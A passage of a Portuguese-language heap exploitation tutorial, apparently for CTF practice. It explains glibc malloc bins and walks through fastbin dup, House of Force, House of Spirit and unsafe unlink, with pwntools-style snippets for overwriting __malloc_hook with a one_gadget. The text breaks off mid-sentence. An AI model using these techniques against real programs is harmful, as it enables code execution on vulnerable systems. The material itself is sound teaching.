<h3 id="unsorted-bin"><a class="header" href="#unsorted-bin">Unsorted bin</a></h3>
<p>O unsorted bin armazena chunks de tamanho diversos, que ser√£o distribu√≠dos 
(<strong>SORT</strong>) para uma <code>small</code>/<code>large</code> bin de tamanho apropriado</p>
<p>A Unsorted bin √© uma doubly linked list (<code>FD</code> e <code>BK</code>) circular!</p>
<p>Na hora de procurar um chunk de tamanho adequado para um <code>malloc()</code>, come√ßa-se 
a busca pela <code>tail</code> e somente retorna um chunk de tamanho id√™ntico 
(<code>exact fit</code>) ao pedido! </p>
<p>Conforme essa lista vai sendo atravessada, o processo de <strong>SORT</strong> vai ocorrer!</p>
<p>Quando o chunk de tamanho correto √© encontrado, ele sofre um 
<a href="https://0xturazzi.github.io/book/heap/malloc/PartialUnlink.html">parcial unlink</a> !</p>
<h4 id="remaindering"><a class="header" href="#remaindering">Remaindering</a></h4>
<p>Caso a busca chegue no <code>ultimo chunk do unsorted bins</code> e ele seja maior do que 
o pedido, ele sera dividido em 2 em um processo chamado <code>remaindering</code>:</p>
<pre><code> _________
|    |size|
| FD | BK |
|         |
|         |
|         |
|         |
|         |
|         |
|         |
|         |
|_________|

Divide o chunk em 2
 _________
|    |size|
| FD | BK |
|         |
|         |
|         |
|_________|
|         |
|         |
|         |
|         |
|_________|

Retorna o primeiro

Coloca o segundo no unsortedbin e 
      o define como last_remainder 
      (pointer na main_arena que 
      aponta para o ultimo chunk
      a ser dividido) 
 _________
|    |size| &lt;- Nosso chunk
|  dados  |
| AAAAAAA |
|         |
|         |
|_________|
|    |size| &lt;-- Unsorted Bins e last_remainder
| FD | BK |
|         |
|         |
|_________|

</code></pre>
<h3 id="small-bins"><a class="header" href="#small-bins">Small Bins</a></h3>
<p>Os small bins sao similares ao unsorted bin, sendo 
<code>double-linked -lists</code> (fd e bk) e circulares. Com essa lista 
sendo <code>FIFO</code>(<code>first-in first-out</code>), os chunks <code>entram/free</code> pela <br />
head e <code>saem/malloc</code> pela tail.</p>
<p>Cada small bins armazena somente um tamanho especifico de chunk, 
de <code>0x20</code> a <code>0x3f0</code>. Como voce pode perceber, existe uma 
intercess√£o entre os tamanhos de fast e small. Nos podemos 
migrar um fast chunk para o unsorted bins (e consequentemente para 
o respectivo small bins usando malloc consolidate())</p>
<h3 id="large-bins"><a class="header" href="#large-bins">Large Bins</a></h3>
<p>Os Large Bins sao:</p>
<ul>
<li>size &gt;= 0x400</li>
<li>Double linked lists (fd e bk)</li>
<li>Listas Circulares
Existem 64, com apenas 63 sendo usados 
<ul>
<li>Large 0x400: 0x400, 0x410, 0x420 e 0x430</li>
<li>Large 0x440: 0x440, 0x450, 0x460 e 0x470</li>
<li>...</li>
</ul>
</li>
</ul>
<p>Quanto maior o size, mais tamanhos de chunks ele armazena, em uma escala 
logar√≠tmica</p>
<ul>
<li>Large 0x400: 0x400, 0x410, 0x420 e 0x430</li>
<li>Large 0x5000: 0x5000, 0x5010, ... , 0x5ff0</li>
<li>Large 0x80000: size &gt;= 0x80000 (teoricamente infinito)</li>
</ul>
<p>Os chunks ficam em ordem decrescente de tamanho em rela√ß√£o a head:</p>
<p><code>head:&gt; 0x430 --- 0x420 --- 0x410 --- 0x400 &lt;:tail</code> </p>
<p>Para manter essa ordem de tamanho, sao usadas skiplists, explicadas depois.</p>
<p>Os primeiros chunks de cada size, alem de <code>fd</code> e <code>bk</code>, possuem <code>fd_nextsize</code> 
e<code>fd_nextsize</code>. Esses chunks que contem metadados adicionais sao chamados de 
skipchunks</p>
<pre><code class="language-py">head:  0x430  0x430     0x420   0x420   0x410     0x400   0x400 :tail
 ...&gt;|      |&gt;|     |&gt;|      |&gt;|     |&gt;|      |&gt;|      |&gt;|     |&gt;... fd
 ...&lt;| skip |&lt;|     |&lt;| skip |&lt;|     |&lt;| skip |&lt;| skip |&lt;|     |&lt;... bk
        ^ |              ^ |              ^ |      ^ |
.....___| |______________| |______________| |______| |___________.....
            fd_nextsize      fd_nextsize               fd_nextsize

E mesma coisa com o bk_nextsize.

Com o fd_nextsize apontando para um tamanho MENOR
Com o bk_nextsize apontando para um tamanho MAIOR
</code></pre>
<p>Assim, os <code>fd_nextsize</code> e <code>fd_nextsize</code> formam uma 
<code>doubly linked circular list</code>, contendo a primeira instancia de cada tamanho de 
chunk presente naquele largebin. Essa &quot;meta-lista&quot; √© a skiplist :D</p>
<p>Quando um chunk de tamanho novo √© <code>free()</code>, ele √© colocado na skiplist do 
respectivo largebin. Em seguida, todos os chunks com aquele tamanho, ser√£o 
colocados logo apos o primeiro, sem interferir com a skiplist.</p>
<p>Mesma coisa com aloca√ß√µes, com o chunk retirado sendo o mais recente a entrar 
naquela skiplist (<code>LIFO</code>). Portanto o skipchunk sera o ultimo a ser 
alocado entre os chunks daquele tamanho. Assim, nao interferindo com a 
skiplist. </p>
<p>Assim, garantindo a ordem de tamanhos dentro de um largebin :D </p>
<blockquote>
<p>Obs: Quando um chunk <strong>NAO</strong> skipchunk √© sort para um large bin, os seus 
bk_nextsize e fd_nextsize SAO <strong>NULLIFICADOS</strong></p>
</blockquote>
<blockquote>
<p>Obs 2: o unlink nos largebins ocorre pelo fd, para evitar 
alocar o skipchunk. E alem disso eles sempre sofrem um unlink <strong>COMPLETO</strong>,
pois o chunk pode vir do meio da lista! (safe unlink)</p>
</blockquote>
<h1 id="outras-opera√ß√µes"><a class="header" href="#outras-opera√ß√µes">Outras opera√ß√µes</a></h1>
<ul>
<li><code>calloc( size )</code>: igual <code>malloc()</code> porem inicializa a regi√£o para NULL
<ul>
<li>Ineficiente porem mais seguro</li>
</ul>
</li>
<li><code>realloc( chunk , size )</code>: muda o tamanho de um chunk
<ul>
<li>Chama <code>free()</code> no chunk, <code>malloc()</code> um novo chunk de tamanho <code>size</code> e transfere os dados do chunk antigo para o novo</li>
<li>Se <code>size == 0</code>, simplesmente atua como um <code>free()</code>: muitos devs nao sabem disso
<ul>
<li>Sanitizam os <code>free()</code>s corretamente, mas esquecem de sanitizar os <code>realloc()</code>s</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fastbins-dup"><a class="header" href="#fastbins-dup">Fastbins Dup</a></h1>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#fastbins-dup">Fastbins Dup</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/fastbinsDup.html#ataques">Ataques</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#alocar-um-chunk">Alocar um chunk</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#obs-__malloc_hook">Obs: __malloc_hook</a></li>
</ul>
</li>
<li><a href="heap/malloc/fastbinsDup.html#exec">Exec</a></li>
<li><a href="heap/malloc/fastbinsDup.html#escrever-um-valor-na-main_arena">Escrever um valor na main_arena</a></li>
<li><a href="heap/malloc/fastbinsDup.html#alocar-um-chunk-na-main_arena">Alocar um chunk na main_arena</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#exemplo-malloc-antigo">Exemplo malloc antigo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="teoria-7"><a class="header" href="#teoria-7">Teoria</a></h2>
<p>Se o chunk tiver nos fastbins (<code>0x20</code> a <code>0x80</code>), voce pode passar 
pelas mitiga√ß√µes de double free.</p>
<p>Se:</p>
<ul>
<li>free chunk_A</li>
<li>free chunk_A</li>
</ul>
<p>As mitiga√ß√µes vao ser ativadas... porem se:</p>
<ul>
<li>free chunk_A</li>
<li>free chunk_B</li>
<li>free chunk_A</li>
</ul>
<p>Voce consegue linkar o chunk_A duas vezes em um fastbin (double free).</p>
<h2 id="ataques"><a class="header" href="#ataques">Ataques</a></h2>
<h3 id="alocar-um-chunk"><a class="header" href="#alocar-um-chunk">Alocar um chunk</a></h3>
<p>Os fastbins sao linkados numa <code>single-linked-list</code>, portanto somente usa 
o <code>fd</code>. Ent√£o, o <code>fd</code> fica na <strong>PRIMEIRA QWORD</strong> do parte dos dados.</p>
<ul>
<li>Double free
<ul>
<li>free chunk_A</li>
<li>free chunk_B</li>
<li>free chunk_A</li>
</ul>
</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
</ul>
<blockquote>
<p>head : Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>ALVO</strong>)</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; ALVO</p>
</blockquote>
<ul>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : ALVO</p>
</blockquote>
<blockquote>
<p>O Proximo malloc ira alocar um chunk em ALVO</p>
</blockquote>
<ul>
<li>alvo = malloc()</li>
<li>edit(alvo, blablabla)</li>
</ul>
<blockquote>
<p>Nos temos um write arbitr√°rio</p>
</blockquote>
<p>Porem existe uma excesso, o <strong>ALVO + 0x8</strong> precisa ser <strong>IGUAL AO TAMANHO DO FASTBIN</strong></p>
<p>Assim, se for o <code>fastbin 0x60</code>,  <code>ALVO + 0x8 == 0x60</code></p>
<p>Para achar um chunk que se encaixa nesses crit√©rios, voce pode usar<br />
<code>find_fake_fast</code> no <code>pwntools</code></p>
<h4 id="obs-__malloc_hook"><a class="header" href="#obs-__malloc_hook">Obs: __malloc_hook</a></h4>
<p>Normalmente o malloc_hook so pode ser corrompido por um chunk de tamanho <code>7f</code>,
assim, o seu fastbin dup tem que ser no fastbin <code>0x70</code>!</p>
<h3 id="exec"><a class="header" href="#exec">Exec</a></h3>
<p>Nos podemos, por exemplo, fazer o anterior com <strong>ALVO = __malloc_hook</strong></p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
<li>edit(chunk_A, <strong>__malloc_hook</strong>)</li>
<li>malloc()</li>
<li>alvo = malloc()</li>
<li>edit(alvo, one_gadget)</li>
<li>malloc() <strong>ativar o hook</strong></li>
</ul>
<h3 id="escrever-um-valor-na-main_arena"><a class="header" href="#escrever-um-valor-na-main_arena">Escrever um valor na main_arena</a></h3>
<p>O valor das <code>head</code>s fica armazenado na <code>main_arena</code>, assim inv√©s de 
colocar um endere√ßo em <code>alvo</code>, podemos colocar um valor:</p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>0x123</strong>)</li>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : 0x123</p>
</blockquote>
<p>Com esse valor podemos facilitar outros tipo de exploit, por exemplo:</p>
<h3 id="alocar-um-chunk-na-main_arena"><a class="header" href="#alocar-um-chunk-na-main_arena">Alocar um chunk na main_arena</a></h3>
<p>Repetindo o anterior usando um Fastbin Dup no <code>0x60</code>:</p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>0x50</strong>)</li>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : 0x50</p>
</blockquote>
<p>Agora usar a t√©cnica de alocar um chunk, usando um Fastbin Dup no <code>0x50</code>:</p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
<li>edit(chunk_A, <strong>main_arena + 48 - 8</strong>)</li>
<li>malloc()</li>
<li>fake = malloc() <strong>Fake Chunk Na Main_Arena</strong></li>
</ul>
<p>Agora temos um chunk que nos permite dar write na main_arena</p>
<blockquote>
<p>OBS :
fastbin 0x60 dentro da main arena == main_arena + 48</p>
<p>alvo == main_arena + 48 - 8</p>
<p>alvo + 8 == head do 0x60 fastbin a.k.a. &quot;0x50&quot;, passando o 
teste ja que o nosso fake chunk tem tamanho 0x50</p>
</blockquote>
<blockquote>
<p>OBS 2 : Esse endere√ßo pode mudar dependendo da vers√£o do malloc, calcula 
de novo ai</p>
</blockquote>
<h4 id="exemplo-malloc-antigo"><a class="header" href="#exemplo-malloc-antigo">Exemplo malloc antigo</a></h4>
<p>Agora, por exemplo, em vers√µes antigas podemos alterar o <code>top</code> na main_arena</p>
<ul>
<li>top = malloc()</li>
<li>edit(top, b'G'*48 + p64(libc.sym.__malloc_hook-0x24)) </li>
</ul>
<pre><code>              Pad    +            top
</code></pre>
<p>Agora o proximo malloc vai alocar proximo ao <strong>__malloc_hook</strong></p>
<ul>
<li>malloc(b'H'*20 + p64(one_gadget)) <strong>Esse chunk ocupa o __malloc_hook</strong> </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-force"><a class="header" href="#house-of-force">House of Force</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfForce.html#house-of-force">House of Force</a></li>
<li><a href="heap/malloc/HouseOfForce.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/HouseOfForce.html#va-wrap-around">VA Wrap-Around</a></li>
<li><a href="heap/malloc/HouseOfForce.html#limita%C3%A7%C3%B5es">Limita√ß√µes</a></li>
<li><a href="heap/malloc/HouseOfForce.html#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></li>
</ul>
<h1 id="teoria-8"><a class="header" href="#teoria-8">Teoria</a></h1>
<p>A t√©cnica da House Of Force consiste em usar um heap overflow para alterar o 
tamanho do top_chunk para o valor m√°ximo ( 0xffffffffffffffff ) ... permitindo 
que um malloc enorme seja alocado pelo top_chunk!</p>
<p>Esse chunk enorme ira cobrir a distancia entre o alvo e o heap atual!</p>
<pre><code class="language-py"> ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20)
|______________________________|
|                              |  
| Top size: 0x3c0              |  &lt;- Nao teve overflow
|______________________________|

 Agora, vamos usar o overflow para deixar o top_chunk.size gigante
 ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20 + p64(0xffffffffffffffff))
|______________________________|
|                              |  
| Top size: 0xffffffffffffffff |
|______________________________|

Agora, vamos alocar um chunk gigante!

Vamos supor que o heap come√ßa em 0x40000 e o alvo esta em 0x60704

Alem disso, vamos supor que o top_size esta no endere√ßo 0x400d0

Assim, queremos alocar um chunk que pare um pouco antes do alvo, 
esse chunk servira somente para &quot;andar ate la&quot;

Assim, quando alocarmos um chunk, ele vai ocupar a mesma posi√ß√£o que o alvo

&gt;&gt;&gt; hex((0x60704 - 0x20) - 0x400d0)
'0x20614'
 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |  &lt;- malloc(0x20614)
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4 -&gt; alvo - 0x20
|                              |  
| Top size: 0xfffffffffffdf9eb |
|______________________________|

Agora, um ultimo chunk para cobrir alvo

 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4
|             | Size: 0x30     |  
|                              | &lt;- malloc(0x28) 
|                              |  
|                              | ___ 0x60704 -&gt; alvo
|                              |  
|______________________________| ___ 0x60714 
|                              |  
| Top size: 0xfffffffffffdf9cb |
|______________________________|

Um edit no chunk pode alterar o alvo!

def Resumo():
    Chunk_1 -&gt; *top_size = 0xfff...
    Chunk_2 -&gt; gigante, usado para atravessar a distancia
    Chunk_3 -&gt; Pode alterar o alvo


Na pratica, o Chunk_3 talvez tenha um tamanho que 
voce nao controle! Ou, alguma outra limita√ß√£o assim!

A situa√ß√£o ideal ocorre quando o inicio da user_data do Chunk_3 
coincide com o endere√ßo do alvo! pois voce nao precisa usar 
padding para alcan√ßar o alvo e portanto, nao arrisca 
danificar outras partes da memoria!

Ent√£o quando estiver praticando, vale a pena ficar brincando com o tamanho do 
Chunk_2 para acertar a mira direitinho :D
</code></pre>
<h1 id="va-wrap-around"><a class="header" href="#va-wrap-around">VA Wrap-Around</a></h1>
<p>No caso anterior, o endere√ßo do alvo era maior que o do heap!</p>
<p>heap: 0x40000 &lt;------&gt; alvo: 0x60704 </p>
<p>E caso seja ao contrario? Vamos precisar dar uma volta no VA space!</p>
<blockquote>
<p>VA = Virtual Address = Endere√ßo Virtual = 0x0000000000000000 ate 0xffffffffffffffff</p>
</blockquote>
<p>Os endere√ßos no VA space dao um loop, assim:</p>
<blockquote>
<p>Se voce esta em 0xffffffffffffff45 e anda para frente, voce vai terminar em 0x0000000000000000a3 ! Dando uma volta no VA space! </p>
</blockquote>
<p>Nos podemos fazer o mesmo com o <code>Chunk_2</code> ! Permitindo que o <code>Chunk_3</code> fique 
em um endere√ßo anterior ao heap! :D</p>
<p>Para encontrar o tamanho do <code>Chunk_2</code> que possibilite isso, podemos usar a fun√ß√£o:</p>
<pre><code class="language-py">def wrap(A,B):
    return (0xffffffffffffffff - A)+B
    #      || tamanho ate        || O quanto andar depois
    #      || O fim do VA space  || de dar o loop 
    
    # Com A = base_do_heap + quantidade_gasta = &amp;top_size
    # B = alvo - 0x20 (tamanho do Chunk_3)  
</code></pre>
<h1 id="limita√ß√µes"><a class="header" href="#limita√ß√µes">Limita√ß√µes</a></h1>
<ul>
<li>Requer um heap leak</li>
<li>Vers√£o Glibc &lt; 2.29</li>
</ul>
<h1 id="fontes-e-materiais-para-praticar"><a class="header" href="#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></h1>
<ul>
<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c">shellphish/how2heap</a></li>
<li>La tamb√©m tem o link pra alguns ctfs que usam house of force!</li>
<li><a href="https://www.udemy.com/share/1039QMBEYadFpWRXo=/">O curso de Heap Exploits do Max Kamper</a> </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-spirit"><a class="header" href="#house-of-spirit">House of Spirit</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfSpirit.html#house-of-spirit">House of Spirit</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#fastbins">Fastbins</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#smallbins">Smallbins</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#exec-converter-em-fastbin-dup">Exec: Converter em Fastbin Dup</a></li>
</ul>
<h1 id="teoria-9"><a class="header" href="#teoria-9">Teoria</a></h1>
<p>House Of Spirit √© uma tecnica que nos permite dar <code>free</code> um chunk falso que 
fica por exemplo, no <code>heap</code>, <code>stack*</code>, <code>data</code>,... ou qualquer outro lugar</p>
<p>A tecnica √© parecida com um fastbin dup, porem menos vers√°til e mais dif√≠cil de 
executar, porem nos permite usar vulnerabilidades fora do heap (como um stack 
bof) e traze-las para o contexto do heap.</p>
<p>Assim, nos criamos um chunk falso e chamamos <code>free()</code> nele!</p>
<p>Um exemplo da vida real seria por exemplo, por meio de um stack bof alterar
um pointer para o heap, ja que eles sao muito comuns, e apontar para o chunk 
falso.</p>
<p>Entre as restri√ß√µes no chunk falso temos:</p>
<ul>
<li>tamanho
<ul>
<li>Voce devera passar pelas mitiga√ß√µes ja pre-existentes para aquele tipo de 
chunk</li>
<li><code>fastbins</code> √© o mais f√°cil</li>
<li><code>small</code> tem mais mitiga√ß√µes porem pode ser usado junto com remaindering 
para criar mais um chunk logo em frente do chunk falso</li>
<li>Eu nao vejo pq usar <code>large</code> poderia ser vantajoso, mas se quiser testar </li>
</ul>
</li>
<li>flags
<ul>
<li>Para precisarmos passar pelo menor numero de mitiga√ß√µes poss√≠vel, temos: </li>
<li>PREV_USE = 1</li>
<li>IS_MMAPED = 0</li>
<li>NON_MAIN = 0</li>
<li>bit sem uso = 0</li>
</ul>
</li>
<li>Endere√ßo
<ul>
<li>Pointer alinhado a 16 bytes</li>
<li>smallbins: endere√ßo &lt;= heap + top_size </li>
</ul>
</li>
</ul>
<p>Alem disso, malloc ira checar se o tamanho do proximo chunk √© valido :
<code>&amp;chunk + chunk.size + 8</code></p>
<pre><code>0000000000000000  0000000000000031 &lt;--| fake 
0000000000000000  0000000000000000    |
0000000000000000  0000000000000000 ___| 
0000000000000000   TAMANHO VALIDO  &lt; &amp;fake + fake.size + 8 = tamanho valido
0000000000000000  0000000000000000
</code></pre>
<p>Ent√£o voce pode simplesmente lotar aquela area com fenceposts ou qualquer valor razo√°vel, sei la, <code>0x21</code>... nao importa muito</p>
<h1 id="fastbins-1"><a class="header" href="#fastbins-1">Fastbins</a></h1>
<p>Fazer a HoS √© mais f√°cil com os fastbins, e voce so deve usar outro tipo caso 
seja vital voce usar remaindering (ou outra capacidade de chunk maiores) ou 
caso voce nao possa controlar o tamanho... Caso contrario use um fastbin... </p>
<p>Nos poder√≠amos por exemplo, num programa que armazena nosso <code>username</code> no 
<code>data</code>, nos vamos usa-lo para armazenar o chunk falso, assim definindo-o como:</p>
<pre><code class="language-py">username = flat(
    0x31,
    0,0,0,0,0,
    0x21,# tamanho valido
)
</code></pre>
<p>O programa possui pointers no heap para o <code>data</code> (<code>+ 0x10</code>) dos chunks... 
Porem algu√©m vacilou e deixou passar um BoF, e como o pointer √© uma vari√°vel 
local da fun√ß√£o, voce nao precisara nem se quer acertar o canary:</p>
<pre><code>| Buf | Dados | Buf Buf | pointers | Buf Buf Buf | canary, rbp, rip, essas coisas
              | Overflow aqui
</code></pre>
<p>Assim, se por meio do overflow colocarmos um dos pointers como: <code>username + 0x10</code> 
( + 0x10 para ajustar, levando em considera√ß√£o que o pointer originalmente 
apontava para o <code>data</code> de um chunk...</p>
<p>E agora quando o programa chamar <code>free</code> nesse pointer, BOOM! Chunk falso no 
fastbin!</p>
<h1 id="smallbins"><a class="header" href="#smallbins">Smallbins</a></h1>
<p>Para os smallbins o procedimento √© similar!</p>
<p>A parte do overflow continua tudo igual, a √∫nica mudan√ßa √© que ao apos o 
tamanho valido, colocamos um fencepost...</p>
<p>Assim, nos evitamos que o chunk consolide para frente!</p>
<pre><code class="language-py">username = flat(
    0xa1,
    0,0,0,0,0,
    0x11, # tamanho valido
    0
    0x11, # nao consolidar
    0
</code></pre>
<p>Alem disso, o endere√ßo do chunk falso deve ser ANTES do heap, para evitar uma 
mitiga√ß√£o</p>
<h1 id="exec-converter-em-fastbin-dup"><a class="header" href="#exec-converter-em-fastbin-dup">Exec: Converter em Fastbin Dup</a></h1>
<p>Bom, e como podemos prosseguir? nos podemos alocar esse chunk e usa-lo para 
dar write, mas isso nao e la muito util, se nos ja pod√≠amos escrever 
naquela regi√£o pra inicio de conversa... ent√£o vamos precisar de algo a mais 
para conseguir uma shell</p>
<p>Para conseguir execu√ß√£o de c√≥digo, nos poder√≠amos por exemplo corromper o 
malloc_hook... mas <code>find_fake_fast</code> em condi√ß√µes normais somente retornara um 
chunk de tamanho <code>7f</code> incompat√≠vel com o House Of Spirit por causa das flags...</p>
<p>Ent√£o vamos voltar a essencia do que esse ataque: free esta sendo chamado num 
pointer, e nos podemos dar overflow nesse pointer</p>
<p>Esse se nos apontarmos esse pointer para um chunk que ja foi liberado? </p>
<p><strong>Double Free!!!!</strong> </p>
<p>Vamos continuar com o exemplo anterior, nos podemos alterar pointers para o 
heap:</p>
<pre><code>| Buf | Dados | Buf Buf | pointers | Buf Buf Buf | canary, rbp, rip, essas coisas
              | Overflow aqui
</code></pre>
<p>E vamos supor o estado atual do heap:</p>
<pre><code class="language-x86asm">0x70 - chunk_A
0x20 - Chunk_B
0x70 - chunk_C
0x50 - chunk_D
</code></pre>
<p>e o nosso overflow corrompe primeiro o pointer para chunk_D!</p>
<pre><code>| Buf Buf | pointer_D pointer_C pointer_B pointer_A |
AAAAAAAAA  
</code></pre>
<p>Para tornar o ataque independente de heap leak, nos podemos alterar somente o 
LSB do pointer</p>
<p>Se alteramos para <code>0x00</code>, ele apontara para o inicio do heap, portanto se 
alterarmos para <code>0x10</code>, estaremos apontando para a user_data do chunk_A</p>
<p>E se mudarmos para <code>0x80</code>, para a user_data do chunk_B</p>
<p>Assim, podemos escolher um deles para dar um double free, eu vou escolher o A!</p>
<p>Como o A √© um fastbin, nos convertemos a House Of Spirit em um fastbin dup...</p>
<p>mesmo se o programa manualmente cuidar dos chunks para previvir um double free,
esse ataque ainda funcionaria, pois tecnicamente a gente chamou free em 
pointers diferentes :D</p>
<pre><code class="language-py">overflow(b&quot;A&quot;*0x120 + &quot;\x10&quot;) # pointer_D -&gt; chunk_A
free(pointer_A)
free(pointer_C) # Free num chunk do mesmo fastbin
free(pointer_D) # Fastbin dup
</code></pre>
<blockquote>
<p>Agora o fastbin 0x70 fica:<br />
head: chunk_A -&gt; chunk_B -&gt; chunk_A</p>
</blockquote>
<p>E voce pode prosseguir normalmente com o fastbin dup, agora podendo criar um 
chunk falso no malloc_hook... Ja que o tamanho <code>7f</code> √© compat√≠vel com o fastbin 
dup :D</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unsafe-unlink"><a class="header" href="#unsafe-unlink">Unsafe Unlink</a></h1>
<ul>
<li><a href="heap/malloc/unsafeUnlink.html#unsafe-unlink">Unsafe Unlink</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#teoria">Teoria</a>
<ul>
<li><a href="heap/malloc/unsafeUnlink.html#overflow">Overflow</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#unlink">Unlink</a></li>
</ul>
</li>
<li><a href="heap/malloc/unsafeUnlink.html#ataque">Ataque</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#final">Final</a></li>
</ul>
<p>O Unsafe Unlink √© o equivalente daquele BoF tradicional com 
o shellcode na stack, o mais b√°sico de todos!</p>
<p>Assim, ele requer que NX e todas essas bobagens estejam 
desligadas... :P</p>
<h1 id="teoria-10"><a class="header" href="#teoria-10">Teoria</a></h1>
<h2 id="overflow-1"><a class="header" href="#overflow-1">Overflow</a></h2>
<pre><code> __________________
|         |  size  |  Nosso chunk
|                  |
|                  |
|__________________|
| prev_sz |  size  | Free chunk
|    fd   |   bk   |
|                  |
|__________________|


BBBBBBBuuuuuuuffffeeerr oooovveeerrrrfllloowww

 __________________
|         |  size  |  Nosso chunk
| AAAAAAAAAAAAAAAA |
| AAAAAAAAAAAAAAAA |
|__________________|
| AAAAAAA |  0x91  | Free chunk
| FFFFFFF | BBBBBB | obs: precisamos colocar
|                  |      um tamanho valido
|__________________|

Assim, nos alteramos o fd e o bk
</code></pre>
<h2 id="unlink"><a class="header" href="#unlink">Unlink</a></h2>
<pre><code>Quando esse free chunk for alocado, ele precisara 
ser UN-LINKADO da free list

Fazer o proximo chunk apontar para o chunk anterior e o
chunk anterior apontar para o proximo chunk

Isto e:
    bk_velho = vitima.bk 
    fd_velho = vitima.fd

    vitima.fd.bk = bk_velho 
    vitima.bk.fd = fd_velho


assim:              vitima   
 ___   bk  ___       _V_       ___       ___ 
|   | --&gt; |   | --&gt; |   | --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- |___| &lt;-- |___| &lt;-- |___|
      fd              

            BK                  FD
 ___       _V_  BK.fd          _V_       ___ 
|   | --&gt; |   | --&gt; ----&gt; --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- &lt;---- &lt;-- |___| &lt;-- |___|              
                     ___ FD.bk
                    |   |
                    |_ _|
                      ^
                    vitima   
</code></pre>
<h1 id="ataque"><a class="header" href="#ataque">Ataque</a></h1>
<p>Assim, se substituirmos o <code>fd</code> e o <code>bk</code>, temos um 
primitivo de <code>reflected-write</code> !</p>
<p>Assim, nos escrevemos:</p>
<ul>
<li><code>fd falso</code> em <code>bk falso + 0x18</code></li>
<li><code>bk falso</code> em <code>fd falso + 0x10</code></li>
</ul>
<p>Portanto, os dois endere√ßos precisam ser validos para 
nao gerar SEGFAULT ! D:</p>
<p>Isso nos deixa com poucas op√ß√µes,.... porem nao existem
prote√ß√µes ent√£o talvez seja poss√≠vel!</p>
<p>Nos podemos colocar a payload no heap (sem <code>ASLR</code>, ent√£o 
temos o endere√ßo dela, e sem <code>NX</code> ent√£o ela executa) e 
